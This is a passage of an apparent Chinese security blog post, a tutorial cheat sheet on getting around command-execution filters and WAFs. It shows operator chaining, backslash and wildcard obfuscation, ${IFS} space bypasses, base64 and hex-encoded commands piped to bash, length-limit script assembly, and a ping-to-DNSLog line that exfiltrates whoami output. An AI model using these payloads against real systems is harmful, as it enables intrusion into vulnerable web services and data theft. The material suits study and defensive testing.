+<h2 id="1-4-逻辑运算符在绕过中的作用"><a href="#1-4-逻辑运算符在绕过中的作用" class="headerlink" title="1.4 逻辑运算符在绕过中的作用"></a>1.4 逻辑运算符在绕过中的作用</h2><p><code>|</code> 在cmd中，可以连接命令，且只会执行后面的命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami | ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> www.baidu.com   //只执行ping<br>ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> www.baidu.com | whoami   //只执行whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAib3eMxxDO6qfz5cmjMhAh8zgUk3vKtT0ZLuGaFJAJ4VbXbtubWfxFmg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><code>||</code> 只有在前面命令失败才执行后面</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> || whoami //不执行whoami<br>ping xxx. || whoami //执行whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAGXVx4htWaX8MOGadb2hOHcicXgFicNDFUpUaNMibDQY9ffv5KhAjUPXHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><code>&amp;</code>无论前面的命令是否能执行成功都会执行后面的命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp; whoami //执行whoami<br>ping xxx. &amp; whoami //执行whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAbZFEKpbfib8ggpzZVaaElgetZenoHPYibbgIFgCTZEQrSRibe1dpOkghA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><code>&amp;&amp;</code>前面命令为真才会执行后面的命令。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-meta">&amp;&amp; whoami <span class="hljs-comment">//执行whoami</span></span><br>ping xxx. <span class="hljs-meta">&amp;&amp; whoami <span class="hljs-comment">//不执行whoami</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDATrsxBpFIwU453O4Lj2mYQu0ghdQhGICAibGjMTldNRnopD8JxL2FibLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>**0x02 Linux（*<em>区分大小写*<em>）</em></em></p>
+<p>2.1 linux下的符号和逻辑运算符</p>
+<p>linux中变量使用<code>$</code>来引用，<code>;</code>表示命令结束无论命令是否执行成功都会执行下一个命令，<code>| || &amp; &amp;&amp;</code>，与Windows一样，这里就不做赘述。</p>
+<p>利用上面的符号可以进行拼接的命令：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">t</span>=l;j=s;i=&quot; -al<span class="hljs-string">&quot;;<span class="hljs-variable">$t</span><span class="hljs-variable">$j</span><span class="hljs-variable">$i</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDANcXvdvFb6j5rHa2a3bEujbnJgiaibgObrCMSO8rJibgFU546BnlFHSgrg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="2-2-利用未被过滤的命令"><a href="#2-2-利用未被过滤的命令" class="headerlink" title="2.2 利用未被过滤的命令"></a>2.2 利用未被过滤的命令</h2><p>假设有命令执行漏洞的网站中过滤的一些命令，但是没有过滤一些命令，例如ping命令，则可以利用ping命令来执行命令带出信息。</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `whoami`.whjtmh.dnslog.cn<br></code></pre></td></tr></table></figure>
+
+<p>利用DNSLog就可以获得带出的信息（对于不回显的命令执行也可以利用这种方法）</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAym5hbSicXvL2BRiaAibBIBsp01QFu4ic0sib9zCUdYbwbUCf1MP3ms4270Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="2-3-linux符号之间的组合"><a href="#2-3-linux符号之间的组合" class="headerlink" title="2.3 linux符号之间的组合"></a>2.3 linux符号之间的组合</h2><p>类似于Windows的<code>&quot;</code>和<code>^</code>linux也有类似的使用方法，就是利用变量和参数</p>
+<p><strong>利用反斜杠绕过</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">who</span>\ami<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用括号括起来（当做命令执行）</strong></p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">whoa</span>&#x27;<span class="hljs-symbol">&#x27;mi</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用反引号或$和括号结合（将括号内命令的结果当做命令执行）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">`(<span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>)`<br>$(<span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用Shell特殊变量绕过</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">who</span>$*ami<br><span class="hljs-built_in">who</span><span class="hljs-variable">$@ami</span><br><span class="hljs-built_in">who</span><span class="hljs-variable">$1ami</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>利用通配符匹配唯一命令名称执行命令（使用命令的绝对路径）</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/u?r/</span>b?n/who?mi<br><span class="hljs-regexp">/*/</span>*/whoam?<br><span class="hljs-regexp">/*/</span>*i[n]/wh??mi<br></code></pre></td></tr></table></figure>
+
+<p><strong>综合组合</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/*<span class="hljs-regexp">/*&quot;&quot;in/w</span><span class="hljs-string">&#x27;h&#x27;</span><span class="hljs-string">`dfds`</span><span class="hljs-string">??</span>m<span class="hljs-variable">$(</span>sdf)i<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-4-linux切割字符串（linux区分大小写）"><a href="#2-4-linux切割字符串（linux区分大小写）" class="headerlink" title="2.4 linux切割字符串（linux区分大小写）"></a>2.4 linux切割字符串（linux区分大小写）</h2><p>在linux中切割字符串的语法是${NAME:start:length}</p>
+<p>与Windows相同这里不在赘述，只要区分大小写就可以</p>
+<h2 id="2-5-绕过空格过滤"><a href="#2-5-绕过空格过滤" class="headerlink" title="2.5 绕过空格过滤"></a>2.5 绕过空格过滤</h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="在前端页面中可以利用-00-0a-0d等url编码来绕过空格的过滤，"><a href="#在前端页面中可以利用-00-0a-0d等url编码来绕过空格的过滤，" class="headerlink" title="在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，"></a>在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，</h3><h3 id="利用大括号来绕过空格限制"><a href="#利用大括号来绕过空格限制" class="headerlink" title="利用大括号来绕过空格限制"></a>利用大括号来绕过空格限制</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;ls,-al&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;ping,-c,2,127.0.0.1&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAlewLe6MhQ3jwEibx7xia9Qjva7b8a6ibG1Ogd8CHvxXNFMKCsVdmSicRmw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<h3 id="IFS-绕过空格"><a href="#IFS-绕过空格" class="headerlink" title="${IFS}绕过空格"></a>${IFS}绕过空格</h3><p>IFS是internal field separator的缩写，shell的特殊环境变量。shell根据IFS存储的值，可以是空格（040）、tab（011）、换行符（012）或者其他自定义符号，来解析输入和输出的变量值。这里echo -n是不进行自动换行</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAsDiaqTYPO5oZHEVtvSORgXxD1YY8OwvzaicZHpVqicW3vOjQvkLAxc1FA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA93kRHZJujhAc10zNhGlQg9Bt4Gj5LU4VgByMuIDmnhC72gua0RATVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>2.6 利用base64绕过命令限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>|<span class="hljs-built_in">base64</span> //先输出<span class="hljs-built_in">whoami</span>的<span class="hljs-built_in">base64</span>编码<br>`<span class="hljs-built_in">echo</span> dwhvYW1pCg==|<span class="hljs-built_in">base64</span> -d` //将其<span class="hljs-built_in">base64</span>解码<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6hz2deFGTib0PPtt2WzkFMNllicCiaYGB6xDDBsibnDbqJyiaick1MTq7jIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<h2 id="2-7-hex编码绕过"><a href="#2-7-hex编码绕过" class="headerlink" title="2.7 hex编码绕过"></a>2.7 hex编码绕过</h2><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs wren"># <span class="hljs-variable">cat</span> <span class="hljs-variable">flag</span>.<span class="hljs-property">php</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">63617420666</span>c61672e706870<br><span class="hljs-variable">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span><span class="hljs-operator">|</span><span class="hljs-variable">xxd</span> <span class="hljs-operator">-</span><span class="hljs-variable">r</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span><span class="hljs-operator">|</span><span class="hljs-variable">bash</span><br><span class="hljs-comment">#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件</span><br>#<span class="hljs-operator">-</span><span class="hljs-variable">r</span>参数：逆向转换。将<span class="hljs-number">16</span>进制字符串表示转为实际的数<br>#<span class="hljs-operator">-</span><span class="hljs-variable">ps</span>参数：以 <span class="hljs-variable">postscript</span>的连续<span class="hljs-number">16</span>进制转储输出，也叫做纯<span class="hljs-number">16</span>进制转储。<br>#<span class="hljs-operator">-</span><span class="hljs-variable">r</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span>将纯十六进制转储的反向输出打印为了<span class="hljs-variable">ASCII</span>格式。<br><br><span class="hljs-variable">cat</span> <span class="hljs-variable">flag</span>.<span class="hljs-property">php</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> \<span class="hljs-variable">x63</span>\<span class="hljs-variable">x61</span>\<span class="hljs-variable">x74</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">x66</span>\<span class="hljs-variable">x6c</span>\<span class="hljs-variable">x61</span>\<span class="hljs-variable">x67</span>\<span class="hljs-variable">x2e</span>\<span class="hljs-variable">x70</span>\<span class="hljs-variable">x68</span>\<span class="hljs-variable">x70</span><br>#经测试，发现在<span class="hljs-variable">php</span>的<span class="hljs-variable">ping</span>环境上执行失败。在<span class="hljs-variable">linux</span>系统上执行成功<br>$(<span class="hljs-variable">printf</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>)<br>&#123;<span class="hljs-variable">printf</span>,<span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>&#125;<span class="hljs-operator">|</span><span class="hljs-variable">bash</span><br>`&#123;<span class="hljs-variable">printf</span>,<span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>&#125;`<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAdMib5bhRgCaibL5dibgf00ichGgSHYpp4NuDllUiaU1N4QNlVRvNpfZ1WlA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h2 id="2-8-长度限制绕过"><a href="#2-8-长度限制绕过" class="headerlink" title="2.8 长度限制绕过"></a>2.8 长度限制绕过</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>可以利用base64解码的方式将脚本写入多个文件合并后再执行</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cat flag.txt&quot;</span> | base64   # 首先生成所需命令的base64字符串<br><br># Y2F0IGZsYWcudHh0Cg==<br><span class="hljs-keyword">echo</span> -n Y2F0IG &gt; <span class="hljs-keyword">a</span><br><span class="hljs-keyword">echo</span> -n ZsYWcu &gt;<span class="hljs-keyword">b</span><br><span class="hljs-keyword">echo</span> -n dHh0Cg== &gt; <span class="hljs-keyword">c</span><br><br>下面合并文件<br><br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">b</span> &gt;&gt; <span class="hljs-keyword">a</span><br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">c</span> &gt;&gt; <span class="hljs-keyword">a</span><br><br>解码文件<br><br>base64 -d <span class="hljs-keyword">a</span> &gt; <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAD3FClyNFl6stkujd7iaicbb4HFcUJtibWCtwOCP3iage4zcmopdVSdWYqg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">首先通过命令创建带有命令分隔的文件<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;txt&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;ag.\\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;fl\\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;t \\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;ca\\&quot;</span></span><br>在用ls -t输出到一个文件中，再利用sh执行<br>ls -t &gt; shell2.sh<br>#如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入qwzf，即<br>ls -at &gt; shell2.sh<br>sh shell2.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7Wyk3S43efk4SEDLkPtDiao9DCaicbwSFd2pB6aiaEAf3ERg2XLAmwStQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><strong>参考：</strong></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery">https://www.anquanke.com/post/id/<span class="hljs-number">208398</span><br>https://<span class="hljs-keyword">update</span>.venuseye.com.cn/reports/<span class="hljs-number">1548417941041</span>/<span class="hljs-meta">%E4</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%A5Emotet</span><span class="hljs-meta">%E4</span><span class="hljs-meta">%B8</span><span class="hljs-meta">%BA</span><span class="hljs-meta">%E4</span><span class="hljs-meta">%BE</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%85</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%88</span><span class="hljs-meta">%86</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%9E</span><span class="hljs-meta">%90CMD</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%91</span><span class="hljs-meta">%BD</span><span class="hljs-meta">%E4</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%86</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%8A</span><span class="hljs-meta">%80</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%9C</span><span class="hljs-meta">%AF20181212</span>.html<br>https://blog.csdn.net/whuslei/article/details/<span class="hljs-number">7187639</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/rce/" class="category-chain-item">rce</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WAF%E7%BB%95%E8%BF%87/" class="print-no-link">#WAF绕过</a>
+      
+        <a href="/tags/rce/" class="print-no-link">#rce</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>命令执行绕过</div>
+      <div>https://pho3n1x-web.github.io/2022/07/14/命令执行绕过/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Pho3n1x</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>July 14, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              <A HREF="HTTPS://CREATIVECOMMONS.ORG/LICENSES/BY-NC-SA/4.0/">CC BY-NC-SA 4.0</A>
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/15/CVE-2023-41542(JeecgBoot_sql)/" title="CVE-2023-41542(JeecgBoot Sql Injection)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2023-41542(JeecgBoot Sql Injection)</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/16/sql%E5%A4%87%E5%BF%98%E5%BD%95/" title="sql备忘录">
+                        <span class="hidden-mobile">sql备忘录</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
